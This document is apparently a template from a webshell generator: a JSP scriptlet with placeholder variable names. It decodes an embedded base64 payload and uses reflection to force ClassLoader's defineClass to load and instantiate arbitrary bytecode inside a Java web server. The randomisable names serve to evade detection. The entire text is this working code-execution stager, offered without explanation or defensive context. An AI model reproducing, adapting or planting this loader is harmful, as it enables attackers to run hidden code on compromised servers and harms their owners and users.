<%
    String {{VAR:payload}} = "{{base64Str}}";
    byte[] {{VAR:bytecode}} = null;
    try {
        Class {{VAR:b64Cls}} = Class.forName("java.util.Base64");
        Object {{VAR:decoder}} = {{VAR:b64Cls}}.getMethod("getDecoder").invoke(null);
        {{VAR:bytecode}} = (byte[]) {{VAR:decoder}}.getClass().getMethod("decode", String.class).invoke({{VAR:decoder}}, {{VAR:payload}});
    } catch (ClassNotFoundException {{VAR:ex}}) {
        Class {{VAR:dtcCls}} = Class.forName("javax.xml.bind.DatatypeConverter");
        {{VAR:bytecode}} = (byte[]) {{VAR:dtcCls}}.getMethod("parseBase64Binary", String.class).invoke(null, {{VAR:payload}});
    }
    java.lang.reflect.Method {{VAR:defMethod}} = null;
    for (java.lang.reflect.Method {{VAR:m}} : ClassLoader.class.getDeclaredMethods()) {
        if ({{VAR:m}}.getParameterCount() == 3
                && {{VAR:m}}.getParameterTypes()[0] == byte[].class
                && {{VAR:m}}.getParameterTypes()[1] == int.class
                && {{VAR:m}}.getParameterTypes()[2] == int.class) {
            {{VAR:defMethod}} = {{VAR:m}}; break;
        }
    }
    {{VAR:defMethod}}.setAccessible(true);
    Class {{VAR:clazz}} = (Class) {{VAR:defMethod}}.invoke(Thread.currentThread().getContextClassLoader(), {{VAR:bytecode}}, 0, {{VAR:bytecode}}.length);
    {{VAR:clazz}}.newInstance();
%>
